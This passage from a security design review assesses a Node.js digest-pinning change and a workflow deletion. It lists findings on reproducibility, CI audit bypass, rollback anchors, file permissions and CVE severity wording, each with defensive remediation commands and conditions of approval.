### Finding SEC-CVE-01 — The M1/M2/M3 comparison is not hermetic: the Dockerfile mutates the base image with network-dependent, unpinned operations

| Attribute | Value |
|---|---|
| **Severity** | 🟡 Medium |
| **OWASP** | A06:2021 — Vulnerable and Outdated Components |
| **CWE** | CWE-1104 / CWE-1059: Incomplete Documentation (of the measured artefact) |
| **CVSS** | 4.4 — `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:N` |
| **Location** | `backend/Dockerfile:194-210` (`npm install -g npm@11.21.0`, `npm pack` of `brace-expansion@5.0.12` and `undici@6.28.1`, `apt-get upgrade -y libpcre2-8-0 perl-base perl-modules-5.36`); TDD §7.5.2 |
| **Status** | Open (design-methodology gap) |

**Description.**
AD-8 defines the security claim as a **differential** between a *baseline* image (pre-change base) and a *candidate* image (pinned base). The procedure builds the baseline with `--build-arg NODE_VERSION=22 --build-arg NODE_BASE_DIGEST=sha256:43ac6c60…772c`. However, `backend/Dockerfile` does not produce a pure Node base derivative: the production stage

- replaces the bundled npm CLI with `npm@11.21.0` and then **overwrites** two of its internal packages with tarballs downloaded at build time via `npm pack` (no integrity assertion beyond npm's own registry TLS);
- runs `apt-get update && apt-get upgrade -y` on three Debian packages, which pulls **whatever versions the Debian mirror serves at build time**.

Consequently:

1. A baseline rebuilt today is **not** the image that shipped before the change — it is a different set of Debian/npm bytes. Rebuilding it to compare against the candidate introduces a confounder exactly where the comparison must be precise.
2. M2 ("fixable CRITICAL/HIGH set did not grow") can therefore report differences caused by mirror drift rather than by the base-image change, in either direction — a false PASS or a false FAIL.
3. The image is **not reproducible from the digest alone**, which contradicts the "reproducible supply chain" rationale cited in the Dockerfile comment and in NFR-SEC-02's spirit.

This is pre-existing and out of the ticket's diff scope, but it directly determines whether the ticket's central security claim is trustworthy — which is why it belongs in this review rather than in a generic backlog.

**Impact.**
The organisation may accept an M1/M2/M3 result that does not actually measure the Node change. The failure is silent: both scans run, both produce JSON, and the diff looks authoritative.

**Remediation.**
Three low-cost amendments to the procedure (no Dockerfile change required for this ticket):

```bash
# 1. Baseline MUST be the currently deployed image, not a rebuild.
BASELINE_REF="$(cat deploy/current-image-digest.txt)"   # ghcr.io/.../backend@sha256:...
# fallback only if no deployed digest is recorded:
# docker build --target production --build-arg NODE_VERSION=22 \
#   --build-arg NODE_BASE_DIGEST=sha256:43ac6c60...772c -t sa4e-backend:baseline ./backend

# 2. Capture the OS package inventory of both images so drift is visible:
docker run --rm --entrypoint dpkg "$BASELINE_REF" -l > dpkg-baseline.txt
docker run --rm --entrypoint dpkg sa4e-backend:node-upgrade -l > dpkg-candidate.txt
diff dpkg-baseline.txt dpkg-candidate.txt | tee dpkg-delta.txt   # attach to EV-14

# 3. Split the claim by package class so Node CVEs are separable from Debian drift:
trivy image --scanners vuln --pkg-types library --severity CRITICAL,HIGH --ignore-unfixed \
  -f json -o trivy-candidate-lib.json sa4e-backend:node-upgrade
trivy image --scanners vuln --pkg-types os --severity CRITICAL,HIGH --ignore-unfixed \
  -f json -o trivy-candidate-os.json sa4e-backend:node-upgrade
```

The M1 criterion (named CVEs absent) is unaffected and remains the primary assertion. M2 should be evaluated on the `library` set (Node/npm ecosystem) with the `os` delta reported separately and attributed in M3.

**Long-term (follow-up):** pin the Debian snapshot used by `apt-get` (`snapshot.debian.org`), or rebuild the base internally and pin *that* digest, so the digest pin actually implies byte reproducibility.

---

## 7. Review Area 4 — Reproducibility and Drift

### 7.1 Assessment of the declaration families

| Family | Designed value | Enforcement | Security assessment |
|---|---|---|---|
| `engines.node` (root, backend) | `>=22.23.4 <23` | **Advisory only** (`engine-strict=false`, no `.npmrc`) | Acceptable as a signal, not as a control (OI-T-01). A developer on 22.22.x gets a warning and proceeds. |
| `.nvmrc` | `22.23.4\n`, 8 bytes, no BOM/CR | Read only by nvm/fnm on POSIX | Correctly specified at byte level; nvm-windows ignores it (documented limitation). Current file is 4 bytes with CRLF, so the byte check is not cosmetic. |
| Docker `ARG` | `22.23.4` + index digest | Hard, but overridable (SEC-SC-01) | The strongest family — with the caveat above. |
| Workflow literals | 27 values across 12 files | Hard (setup-node installs the exact literal) | Correct but brittle: 27 hand-edited values, no `node-version-file` (OI-T-04). The census (28 keys) is the only detector. |
| Lockfile metadata | 2 `engines` entries | Derived via `--package-lock-only --ignore-scripts` | Correct method; `--ignore-scripts` avoids triggering the repo's `postinstall` rewriter. |
| `build-onnxruntime` matrix | Unchanged ABI selector | Hard but intentionally decoupled from the runtime pin | Correct distinction (`node_version` ≠ `node-version`); documented as DR-06. |

### Finding SEC-DR-01 — CI installs with `npm install --force --no-audit --no-fund`, so the lockfile and the advisory database are both bypassed

| Attribute | Value |
|---|---|
| **Severity** | 🟡 Medium |
| **OWASP** | A06:2021 / A08:2021 |
| **CWE** | CWE-1104; CWE-829 |
| **CVSS** | 5.4 — `AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N` |
| **Location** | `.github/workflows/ci.yml:20-26, 48-54, 73-79, 98-104` (all four jobs) |
| **Status** | Open (pre-existing; directly relevant to the ticket's reproducibility claims) |

**Description.**
All four `ci.yml` jobs install with:

```bash
npm install --force --no-audit --no-fund
npm install --force --no-audit --no-fund --os=linux --cpu=x64 @rolldown/binding-linux-x64-gnu
```

`npm install` (not `npm ci`) reconciles the manifest against the registry and may update the lockfile-derived tree; `--force` disables peer-dependency conflict checks; `--no-audit` disables the vulnerability audit that npm would otherwise perform. The second command additionally installs a **platform-specific optional dependency that is not in the lockfile for every platform**, which is why `npm ci` was presumably avoided.

The design asserts that "the dependency tree must be identical to the pre-change tree (AC-07)" and that `integrity` hashes must not change. Neither statement is *verified by CI*: CI never compares the installed tree to the lockfile, and never queries advisories. The only tree-level check in the plan is a manual `git diff` of `package-lock.json`.

**Impact.**
The reproducibility guarantee the ticket relies on is enforced by human diff review only. Separately, the primary CI path provides no dependency-vulnerability signal at all, which weakens the organisation's ability to notice that the pinned runtime's *application* dependencies have drifted into a vulnerable range.

**Remediation.**
Split the workaround from the install, and restore the audit:

```yaml
      - name: Clean install (root workspace + rolldown binding)
        run: |
          set -euo pipefail
          rm -rf node_modules backend/node_modules extension/node_modules
          npm ci                      # lockfile is authoritative again
          npm install --no-save --no-audit --no-fund \
            --os=linux --cpu=x64 @rolldown/binding-linux-x64-gnu

      - name: Dependency audit (high and above)
        run: npm audit --audit-level=high
```

If `npm ci` cannot be made to work with the platform binding in this ticket's scope, the minimum acceptable action is to **remove `--no-audit`** and add `npm audit --audit-level=high` as a non-blocking step, then file the `npm ci` migration as a follow-up. Record the decision in the PR so the omission is explicit (the design already uses this pattern for AF-TA-05).

---

### Finding SEC-DR-02 — Pin enforcement relies on 27 literals and a manual monthly check; no automated drift job

| Attribute | Value |
|---|---|
| **Severity** | 🔵 Low |
| **OWASP** | A06:2021 |
| **CWE** | CWE-1059 / CWE-1104 |
| **CVSS** | 3.1 — `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N` |
| **Location** | TDD OI-T-01 / OI-T-04 / OI-T-11; `.github/workflows/*.yml` (27 literals) |
| **Status** | Accepted by design with a compensating control — Security accepts **only if** the follow-up tickets are actually created (condition C-5) |

**Description.**
The pin can regress without a red build in three ways: (a) `engines` is advisory and nothing fails on a lower runtime; (b) a new workflow added by the next ticket will copy `node-version: '22'` from a template (the repository already has 16 workflows and grows by one per feature ticket — OI-T-06); (c) no CI job asserts INV-01. The design is honest about all three and replaces automation with a monthly manual diff.

**Impact.**
A silent regression re-exposes the runtime to CVE-2026-111497 with no failing check. The likelihood grows with every new workflow.

**Remediation.**
The TDD's own §11.8 promotion path is the right fix: a committed `scripts/verify-node-pin.mjs` plus a CI job that runs it, asserting `engines` = `.nvmrc` = `ARG NODE_VERSION` = every `node-version:` literal = the deployed image's `node -v`. That job is also the natural home for the SEC-SC-01 digest assertion. Security requires this to be a **dated follow-up with an owner**, not an open item.

---

## 8. Review Area 5 — Failure Modes and Rollback

### 8.1 Failure-mode analysis

| # | Failure mode | Detection in the design | Blast radius | Assessment |
|---|---|---|---|---|
| F-1 | Wrong digest (typo, wrong variant, platform digest) | N-1…N-5, E-1/E-2/**E-3** | Broken image or wrong runtime | **Adequate.** E-3 (in-image `node -v`) is the only catch-all and must not be skipped. |
| F-2 | Digest disappears from the registry (GC/mirror rotation) | Build fails; §10.3 emergency path | Build outage | **Adequate** — explicit prohibition on falling back to a floating tag. |
| F-3 | Tag re-pointed after resolution | Digest pin keeps old bytes | None | **Adequate** (T-1 residual accepted). |
| F-4 | Partially applied CR-01 (file deleted, consumers not edited) | Atomic commit + census + AC-08 sweep | Dangling dispatch or dead trigger | **Well covered** (the design's strongest section). |
| F-5 | Orphaned required status check after deletion | §13 14.7 + AF-3 | Merge permanently blocked | **Covered**, but only *after* merge; recommend checking branch protection **before** opening the PR. |
| F-6 | Runner cannot obtain 22.23.4 (network/toolcache) | `setup-node` fails the job | Red CI | **Fail-closed — correct.** |
| F-7 | Native module ABI break | In-image `onnxruntime-node` probe (SCC-01) | Startup failure | **Adequate.** Probe is in the image, not a host build — the correct place. |
| F-8 | Pin regression (new workflow, lower runtime) | Monthly manual check only | CVE re-exposure, silent | **Weak** → SEC-DR-02. |
| F-9 | Vulnerable image published before scan | Trivy step ordering | Distribution of a vulnerable image | **Weak** → SEC-CI-01. |
| F-10 | Evidence produced on a foreign runtime | CC-01 gate + AD-9 CONTAINER mode | Invalid evidence | **Adequate** (gate aborts, no partial PASS). |
| F-11 | Baseline/candidate comparison confounded by apt/npm drift | None | False PASS/FAIL on NFR-SEC-01 | **Weak** → SEC-CVE-01. |

### Finding SEC-RB-01 — RB-4 (redeploy the previous digest) has no recorded anchor

| Attribute | Value |
|---|---|
| **Severity** | 🔵 Low |
| **OWASP** | A04:2021 — Insecure Design |
| **CWE** | CWE-1059: Incomplete Documentation |
| **CVSS** | 3.1 — `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N` |
| **Location** | TDD §10.3 (RB-3, RB-4); §13 steps 0/14; EV-01…EV-16 |
| **Status** | Open |

**Description.**
RB-4 is the fastest recovery path for "a deployed image is bad but the source is fine": re-point the deployment to the **previous image digest**. But no step in the plan, and no evidence artefact, requires **capturing that digest before rollout** (together with its in-image `node -v` and scan status). EV-01…EV-16 cover the candidate, the tree, the runtime and the gate run; none covers "what is running now". In an incident, the on-call engineer would have to reconstruct the previous digest from GHCR tag history while under pressure — and if the failing image was also pushed as `latest`, the tag no longer helps.

RB-3 is better handled (named approver, compensating control, dated forward-fix), but it too assumes the rollback target is known.

**Impact.**
Recovery time is dominated by archaeology instead of a recorded reference. Because rolling back re-exposes the CVE, a delayed or improvised rollback also increases the chance that the team stays on a bad image.

**Remediation.**
Add one precondition (Step 0) and one evidence item:

```bash
# Step 0.x — rollback anchor (record in the PR evidence block as EV-00)
PREV_REF="$(kubectl get deploy/backend -o jsonpath='{.spec.template.spec.containers[0].image}')"
echo "previous=$PREV_REF" | tee -a gate-evidence.txt
docker run --rm --entrypoint node "${PREV_REF}" -v    # e.g. v22.22.x
trivy image --severity CRITICAL,HIGH --ignore-unfixed "${PREV_REF}" | tail -20
```

If the platform cannot report the running image, derive it from the last successful `build-push-backend` run on `main` and record the run URL. Either way, **RB-4 must cite a concrete digest that was written down before the change**, not one discovered afterwards.

---

## 9. Review Area 6 — Security Regression from Deleting the `better-sqlite3` Workflow

### 9.1 Regression assessment

| Question | Finding | Verdict |
|---|---|---|
| Is `better-sqlite3` a runtime or build dependency of this repository? | No manifest declares it (`package.json`, `backend/package.json`, `extension/package.json`); the lockfile contains exactly one metadata-only optional-peer entry inherited from `knex` (`package-lock.json:11620`); `node_modules` is not expected to contain it. | **Confirmed — no runtime regression.** |
| Does the workflow produce anything the image or the extension consumes? | It compiles the package in a throwaway `build-temp/` and publishes `.node` files as **GitHub Release assets** (`build-native.yml:108-131, 147-166`). Nothing in this repository downloads them. | **Confirmed — no in-repo consumer.** |
| Does removing it weaken a security control? | It **removes** a control rather than weakening one: (a) a `contents: write` release job (`:136-137`), (b) an `npm install "<user-input>@<version>"` path (`:110`), (c) a workflow with no top-level `permissions:`. | **Net improvement.** |
| Does removing it change the CVE posture? | No. The vulnerable runtime is the Node binary, not this package; the package is absent from the image. | **No change.** |
| Does it leave an unreachable trigger or a dangling dispatch? | Both sides of the edge are removed in one commit (FR-14/15/16), verified by AC-08 sweep and `gh workflow list`. | **Correctly handled.** |
| Does it remove a required status check used by branch protection? | Not visible from the repository; the design requires a settings review (§13 14.7). | **Requires the manual settings check to actually happen** (operational condition C-7). |

### Finding SEC-RM-01 — Previously published `better-sqlite3` prebuilt binaries remain downloadable and unadvised

| Attribute | Value |
|---|---|
| **Severity** | 🔵 Low |
| **OWASP** | A08:2021 — Software and Data Integrity Failures |
| **CWE** | CWE-1104: Use of Unmaintained Third-Party Components |
| **CVSS** | 3.1 — `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N` |
| **Location** | GitHub Releases tagged `better-sqlite3-v11.10.0` (produced by `build-native.yml:159-166`, `--clobber`) |
| **Status** | Open (accepted as DR-08/OI-T-14; Security adds a concrete action) |

**Description.**
Deleting the workflow stops future builds but does not withdraw the artefacts already published. The existing assets are prebuilt binaries of `better-sqlite3@11.10.0` for four platforms, published with `--clobber` and accompanied by per-file `.sha256` files. They remain publicly downloadable indefinitely, with no notice that:

- the pipeline that produced them no longer exists in this repository (so no future rebuild or re-sign);
- `11.10.0` is frozen at whatever advisory state it had in October 2026;
- consumers cannot verify provenance beyond the published checksum.

This is an **availability/trust** issue for external consumers, not a confidentiality issue for this product — which is why it is Low. But the ticket's rationale ("dead pipeline, no consumer") is about *this* repository; the assets' consumers are, by definition, outside it.

**Impact.**
An external consumer can keep installing an unmaintained, potentially vulnerable native binary that appears to be maintained by this project. If the organisation ever needs to withdraw it (e.g., a CVE in `better-sqlite3`), there is no process to do so.

**Remediation.** (does not require workflow changes)

1. Edit the two release notes (`better-sqlite3-v11.10.0` and any earlier tags) to add a deprecation banner: *"This prebuild set is no longer produced or maintained by this repository as of 2026-10. Use the upstream package or build from source. Checksums are provided as-is."*
2. Confirm with the product owner whether any downstream artefact consumes these assets; record the answer in the PR (the design already asks for this in OI-T-14).
3. If withdrawal is required, delete the assets and publish a security notice — do **not** silently remove them without a notice, since pinned consumers would break without explanation.

---

## 10. Additional Observations

### Finding SEC-DK-01 — `chmod -R 777 /home/sa4e` survives in the production stage

| Attribute | Value |
|---|---|
| **Severity** | 🔵 Low |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **CWE** | CWE-732: Incorrect Permission Assignment for Critical Resource |
| **CVSS** | 2.5 — `AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N` |
| **Location** | `backend/Dockerfile:252` (production stage), immediately before `USER sa4e` (`:254`) |
| **Status** | Open (pre-existing; explicitly outside SCC-07 because SCC-07 is diff-scoped) |

**Description.**
The no-relaxation invariant (SCC-07) forbids *adding* `chmod 777`, and it works as designed — the change adds no relaxation. But the invariant is diff-scoped, so the existing world-writable home directory remains. In a single-service container the practical impact is limited (defence in depth rather than a direct escalation), yet it violates least privilege, permits any process in the container to plant files in the service account's home, and would become material if a second user or a shared volume is ever added.

**Remediation.** (one-line change, follow-up ticket)

```dockerfile
RUN groupadd -g 1001 sa4e \
 && useradd -u 1001 -g sa4e -r -s /usr/sbin/nologin sa4e \
 && mkdir -p /app/.code-intel /home/sa4e \
 && chown -R sa4e:sa4e /app /home/sa4e \
 && chmod -R u+rwX,go-w /home/sa4e
```

If a follow-up is not approved, record the acceptance explicitly in the security risk register — do not leave it as an implicit inheritance.

---

### Finding SEC-DOC-01 — CVE severity is mis-stated as "High"; the public score is CVSS v4 9.2 Critical

| Attribute | Value |
|---|---|
| **Severity** | ℹ️ Informational |
| **OWASP** | — (documentation / risk communication) |
| **CWE** | CWE-1059: Incomplete Documentation |
| **CVSS** | 0.0 |
| **Location** | `documents/SA4E-386/BRD.md` and `documents/node-security-upgrade/PLAN.md` ("CVE-2026-111497 (High)"); TDD title says "Related Highs" |
| **Status** | Open |

**Description.**
The CVE record, the Node.js advisory coverage and independent analyses (Rapid7, SecurityWeek, ASEC) all report **CVSS v4 9.2 (Critical)**. Node.js's own severity taxonomy labels the issue High. The ticket inherits the "High" label. The consequence is presentational but real: a reader of the commit log or the PR sees "High" while the risk register should say "Critical, CVSS v4 9.2", and the rollback conditions in RB-3/RB-4 ("re-exposes the application to CVE-2026-111497") understate what is being re-exposed.

**Remediation.**
In the commit body and PR section 1, write: *"CVE-2026-111497 — Brotli decoder out-of-bounds write, CVSS v4 9.2 (Critical); Node.js classifies it as High. Fixed in 22.23.4."* No change to BRD/FSD is required (Security does not modify requirement documents); the correction belongs in the PR record and in the risk register line for RB-3/RB-4.

---

## 11. Findings Summary

| ID | Title | Severity | Area | Introduced by this change? | Blocking |
|---|---|---|---|---|---|
| SEC-CI-01 | Trivy gate runs after push and is skipped on PRs | 🟠 High | CI/CD | No (pre-existing gate, relied upon by the design) | **Yes** (compensating control) |
| SEC-SC-01 | Digest enforced only via overridable `ARG`; no CI assertion | 🟡 Medium | Supply chain | No (design gap in the new control) | **Yes** |
| SEC-SC-03 | No automated digest/CVE refresh; pin decays | 🟡 Medium | Supply chain | No (deferred as OI-T-08/11) | No (dated follow-up) |
| SEC-CI-02 | Four workflows without top-level `permissions:` | 🟡 Medium | CI/CD | No (three are edited here) | No (record + follow-up) |
| SEC-CI-03 | Preserved ONNX workflow interpolates input into shell | 🟡 Medium | CI/CD | No (preserved by BR-30) | No (follow-up) |
| SEC-CI-06 | Mutable third-party action tag in a write-token workflow | 🟡 Medium | CI/CD | No | No (follow-up) |
| SEC-CVE-01 | M1/M2/M3 comparison not hermetic (unpinned apt/npm overlay) | 🟡 Medium | CVE posture | No (methodology) | Partly (C-1) |
| SEC-DR-01 | CI uses `npm install --force --no-audit` | 🟡 Medium | Reproducibility | No | No (follow-up) |
| SEC-SC-02 | No signature/provenance/SBOM verification | 🔵 Low | Supply chain | No | No |
| SEC-CI-04 | `workflow_run` consumer lacks provenance guard | 🔵 Low | CI/CD | No | No |
| SEC-CI-05 | Over-scoped workflow permissions; inline secret argv | 🔵 Low | CI/CD | No | No |
| SEC-DR-02 | 27 literals + manual monthly check; no drift job | 🔵 Low | Reproducibility | No (accepted as OI-T-11) | No (dated follow-up) |
| SEC-RB-01 | No recorded rollback anchor for RB-4 | 🔵 Low | Rollback | **Yes** (design omission) | **Yes** (cheap) |
| SEC-RM-01 | Published `better-sqlite3` assets remain, unadvised | 🔵 Low | Removal | **Yes** (consequence of deletion) | No |
| SEC-DK-01 | `chmod -R 777 /home/sa4e` in production stage | 🔵 Low | Hardening | No (pre-existing) | No |
| SEC-DOC-01 | CVE severity mis-stated as High vs CVSS 9.2 Critical | ℹ️ Info | Documentation | No | No |

**Nothing in the list is a vulnerability in the change itself.** Six of the sixteen are pre-existing conditions the design either relies on (CI-01, SC-01) or preserves (CI-02, CI-03, CI-06, DK-01). The change introduces no new attack surface and removes some.

---

## 12. Controls Verified as Effective

A review that lists only weaknesses is not a review. The following controls were checked and found sound; they should not be re-litigated in the PR.

| Control | Verification performed | Verdict |
|---|---|---|
| **OCI index vs platform digest** | N-4 forbids `--override-arch`; §6.1 requires the multi-arch manifest-list digest | ✅ Correct; this is the single most commonly botched part of digest pinning |
| **Digest normalisation** | N-1…N-5 cover prefix, length, case, quoting, variant | ✅ Testable and complete |
| **Binding proofs** | E-1 (registry ⇄ file), E-2 (build log), E-3 (in-image `node -v`) | ✅ E-3 is the only control that catches a valid-but-wrong digest; it is correctly mandatory on the container path |
| **No fallback to floating tags** | §10.3 emergency path explicitly forbids `node:22-slim` unpinned | ✅ Correct trade-off |
| **No credential-bearing build args** | Diff touches only `NODE_VERSION`/`NODE_BASE_DIGEST`; Dockerfile header states the invariant | ✅ Verified |
| **Build-arg override in CI (today)** | `build-push-backend.yml:110-121` passes no `build-args` | ✅ True today (see SEC-SC-01 for durability) |
| **Atomic CR-01 removal** | File + both consumers in one commit; both sides of the trigger edge removed | ✅ Exemplary; prevents both dangling dispatch and dead `workflow_run` |
| **Trigger-graph invariant** | §6.3 table + FV-19/FV-20 + post-merge `gh workflow list` check | ✅ Stronger than a grep-only check |
| **ONNX capability preservation** | Byte-identical requirement (BR-30) with `git show HEAD:` comparison | ✅ Prevents the "cleanup" regression (DR-07) |
| **No `better-sqlite3` reintroduction** | BR-29 + `npm ls better-sqlite3` + lockfile inspection | ✅ Verified: absent from all manifests, one metadata peer entry only |
| **No runtime/image regression from removal** | Workflow builds in `build-temp/`, publishes release assets, no in-repo consumer | ✅ Confirmed by reading `build-native.yml:108-166` |
| **Diff-scoped no-relaxation** | SCC-07 greps added lines for `--insecure`, `USER root`, `chmod 777`, permissive flags | ✅ Correct scope (with the DK-01 caveat about pre-existing lines) |
| **Truthful evidence vocabulary** | `PASS`/`FAIL`/`NOT_EXECUTED`; `NOT_EXECUTED` never aggregated to PASS | ✅ This is the difference between evidence and assertion |
| **Runtime-foreign-host handling** | CC-01 aborts the run before any verdict; CONTAINER mode binds the runtime | ✅ Removes the "verified on Node 24" failure mode |
| **Secret-free diff** | No token, credential or registry auth appears in any added line | ✅ Verified across the 18-path allow-list |

---

## 13. Conditions of Approval

**Verdict: APPROVED WITH CONDITIONS.** The pin may be implemented and merged once the three blocking conditions are satisfied. The remaining conditions must be filed as dated tickets with named owners **before** merge; they are not blockers for the CVE fix.

### Blocking (must be satisfied before merge)

| # | Condition | Satisfies | Evidence required in the PR |
|---|---|---|---|
| **C-1** | Produce AD-8 evidence with the **currently deployed image** as the baseline (not a rebuild), using the CI-equivalent flags **and** one unfiltered run; attach the JSON summaries and the `dpkg` delta. | SEC-CI-01 (compensating control), SEC-CVE-01 | M1 result, M2 diff (empty or attributed), M3 attribution table, unfiltered finding list, baseline digest reference |
| **C-2** | Record the **rollback anchor**: current production image digest, its in-image `node -v`, and its CRITICAL/HIGH scan summary. | SEC-RB-01 | One evidence line + the digest string, written **before** the merge |
| **C-3** | Prove the digest is not merely declared but used: either the CI assertion from SEC-SC-01 is added, or the E-1 transcript is attached and the reviewer explicitly confirms that no `--build-arg` overrides `NODE_VERSION`/`NODE_BASE_DIGEST` in any workflow. | SEC-SC-01 | Registry digest output, Dockerfile line, E-2 grep of the build log |

### Non-blocking (dated follow-up tickets, owner named before merge)

| # | Condition | Satisfies | Target |
|---|---|---|---|
| **C-4** | Reorder the image pipeline: build → scan → push; enable the Trivy step on `pull_request` builds; stop publishing `latest` before a green scan. | SEC-CI-01 | Next DevOps ticket; before the next base-image change |
| **C-5** | Enable Dependabot for the `docker` and `github-actions` ecosystems; add the committed INV-01/digest assertion job; name the owner of the monthly drift check. | SEC-SC-03, SEC-SC-01, SEC-DR-02 | Within 30 days; the drift job before the next Node bump |
| **C-6** | Harden the surviving prebuild pipeline: validate `onnxruntime_version`/`node_version` against an allow-list, pass inputs via `env:`, add top-level `permissions: contents: read`, SHA-pin `softprops/action-gh-release`, and scope `publish.yml` permissions per job. | SEC-CI-03, SEC-CI-04, SEC-CI-05, SEC-CI-06 | Within 60 days |
| **C-7** | Operational close-out: (a) confirm no required status check named `Build Native Addons (better-sqlite3)` remains **before** opening the PR; (b) publish a deprecation note on the existing `better-sqlite3-v*` release assets; (c) record the repository default workflow-token permission. | SEC-RM-01, SEC-CI-02 | Before merge for (a) and (c); within 30 days for (b) |

### Explicit non-conditions

- **Do not** delay the pin to fix SEC-CI-01…CI-06 in the same commit. Those fixes are structural workflow changes forbidden by BR-18 and would convert a critical CVE patch into a CI refactor with its own regression risk.
- **Do not** relax `engines` to make a host install succeed (§7.7 already forbids this). If `npm ci` warns on a Node-24 host, the answer is CONTAINER mode, not a wider range.
- **Do not** add `engine-strict=true` in this ticket (AD-2 is correct); it would break every current host and make the verification harness unrunnable.

---

## 14. Remediation Priority

| Priority | Finding | Effort | Risk reduction | Owner |
|---|---|---|---|---|
| 1 | **C-1/C-3** — evidence + digest assertion (SEC-CI-01, SEC-SC-01) | Low | Makes the security claim verifiable and the pin enforceable | DEV + Security |
| 2 | **C-2** — rollback anchor (SEC-RB-01) | Very low | Restores a usable RB-4 under pressure | DevOps |
| 3 | **SEC-CI-01 proper** — scan-before-push + PR scanning | Medium | Turns the gate from a flag into a gate | DevOps |
| 4 | **SEC-CI-03** — ONNX input validation + permission scoping | Low | Removes write→RCE/release escalation | DevOps |
| 5 | **SEC-SC-03 / C-5** — Dependabot + drift job | Low | Stops the pin from decaying | DevOps |
| 6 | **SEC-DR-01** — `npm ci` + audit in CI | Medium | Restores lockfile authority and advisory signal | DevOps |
| 7 | **SEC-CI-06 / SEC-CI-05** — SHA pinning + secret hygiene | Low | Reduces third-party action and token exposure | DevOps |
| 8 | **SEC-CVE-01** — hermetic baseline procedure | Low (procedure) / High (snapshot pinning) | Makes M2 trustworthy | DEV + Security |
| 9 | **SEC-CI-02** — `permissions:` blocks | Low | Closes inherited-token exposure | DevOps |
| 10 | **SEC-RM-01 / SEC-DK-01 / SEC-DOC-01** — hygiene | Very low | Consumer trust, defence in depth, accurate risk language | DevOps / SM |

---

## 15. Verdict and Rationale

**APPROVED WITH CONDITIONS.**

**Why not "Approved":** the design leans on a CI gate that cannot block distribution (SEC-CI-01) and on a digest that is declared rather than enforced (SEC-SC-01). Both are cheap to compensate for, but leaving them implicit would mean the ticket's central security claim rests on reviewer diligence. The evidence procedure also needs the deployed-digest baseline (SEC-CVE-01) or M2 may measure Debian mirror drift instead of the Node change.

**Why not "Changes Required":** none of the findings concerns the change's own correctness, and none is a vulnerability that the change introduces. The pin is the right version, the digest procedure is the right procedure, the removal is genuinely dead code with no consumer, and the diff is tightly scoped with a no-relaxation invariant. Requiring a CI refactor before shipping a CVSS 9.2 fix would trade a certain, current exposure for a hypothetical one. The three blocking conditions are evidence obligations, not design changes — they can be satisfied without touching the 18-path diff.

**Conditions of the approval, restated in one sentence:** *produce the M1/M2/M3 evidence against the deployed baseline, write down the rollback digest before merging, and prove the digest is the one the build actually used — then file the four CI/CD hardening tickets, with the scan-before-push fix scheduled before the next base-image change.*

---

## 16. Scope Limitations and Assumptions

1. **Static review only.** No Trivy run, no image build, and no workflow execution were performed. Statements about the CVE status of `22.23.4-slim` are about the *procedure*, not measured output. Security sign-off on AC-05 remains conditional on C-1.
2. **The CVE premise was verified against public sources** (CVE.org, Node.js advisory coverage, Rapid7/SecurityWeek/ASEC reporting) on 2026-10-28, not against the internal advisory feed. G1 must still re-check at implementation time (R-04/R-07).
3. **Branch protection, repository token defaults, environment secrets, and registry configuration are not visible from the repository.** Findings SEC-CI-02 and the required-status-check step depend on settings that must be confirmed manually.
4. **Reachability judgement** (Brotli path via `fetch()` in `@huggingface/transformers`) is based on the absence of Brotli handling in `backend/src` and on the declared dependency graph; it was not dynamically confirmed.
5. **Assumption inherited from the design:** `build-push-backend.yml` continues to pass no `build-args` for the Node pin. If that changes, SEC-SC-01 becomes a High finding rather than a Medium one.
6. **Not reviewed:** application-layer security, runtime sandbox behaviour (`npm`/`npx` reachable from the sandbox module), MCP protocol authorization, secret management outside GitHub Actions.
7. **Documents were not modified.** This review is advisory input to the PR; TDD v1.1 and FSD v1.3 remain as issued.

---

## 17. Appendix

### A. Sources consulted

| Source | Use |
|---|---|
| CVE.org — CVE-2026-111497 (published 2026-10-22) | CVE identity, affected Node 22.x range, CVSS v4 9.2 |
| Node.js October 2026 security releases (advisory) | Fix versions per release line (22.23.4 / 24.22.1 / 26.12.1) |
| Rapid7 ETR, SecurityWeek, ASEC advisories (2026-10-25/26) | Independent confirmation of the affected range and exploitation preconditions |
| OWASP Top 10 (2021), OWASP Testing Guide v4.2 | Category mapping |
| CWE-494, CWE-693, CWE-78, CWE-250, CWE-345, CWE-522, CWE-732, CWE-1059, CWE-1104, CWE-1357 | Weakness classification |
| SLSA v1.0 (Build levels) | Provenance reasoning (SEC-SC-02) |
| GitHub Actions security hardening guidance | `workflow_run` risk, script injection via `${{ }}` in `run:`, least-privilege tokens, SHA pinning |

### B. Repository evidence index

| Claim | Evidence |
|---|---|
| Base image ARGs and FROM indirection | `backend/Dockerfile:32,35,40,178` |
| Production-stage mutation of base (npm overlay + apt upgrade) | `backend/Dockerfile:194-210` |
| World-writable home | `backend/Dockerfile:252` |
| Trivy flags and PR exclusion | `.github/workflows/build-push-backend.yml:126-134` |
| Push precedes scan | `.github/workflows/build-push-backend.yml:110-121` vs `:126` |
| Workflow-level permissions on publish | `.github/workflows/publish.yml:18-20` |
| Inline marketplace tokens | `.github/workflows/publish.yml:89,93` |
| `workflow_run` consumer and write push | `.github/workflows/auto-release.yml:4-8,15-16,76-87,101` |
| ONNX input interpolation and install | `.github/workflows/build-onnxruntime.yml:48-49,105-114` |
| ONNX release job permissions | `.github/workflows/build-onnxruntime.yml:146-150` |
| Removed workflow's release write path | `.github/workflows/build-native.yml:133-166` |
| Workflows without `permissions:` | `ci.yml`, `ci-sa4e-191.yml`, `ci-sa4e-223.yml`, `build-onnxruntime.yml` |
| `npm install --force --no-audit` | `.github/workflows/ci.yml:24-25,52-53,77-78,102-103` |
| Scheduler permissions and better-sqlite3 plumbing | `.github/workflows/scheduled-prebuild-scan.yml:10,14-16,76-87` |
| `better-sqlite3` absent from manifests | `package.json`, `backend/package.json`, `extension/package.json` |
| Single metadata-only lockfile mention | `package-lock.json:11620` |

### C. Suggested PR evidence block (adapted from the TDD, with this review's additions)

```text
[EV-00] rollback anchor      previous image = ghcr.io/.../backend@sha256:<digest>   node -v = v22.2x.y
[EV-01] runtime              v22.23.4 (mode: HOST|CONTAINER)
[EV-05] digest resolution    docker buildx imagetools inspect node:22.23.4-slim -> sha256:<64 hex>
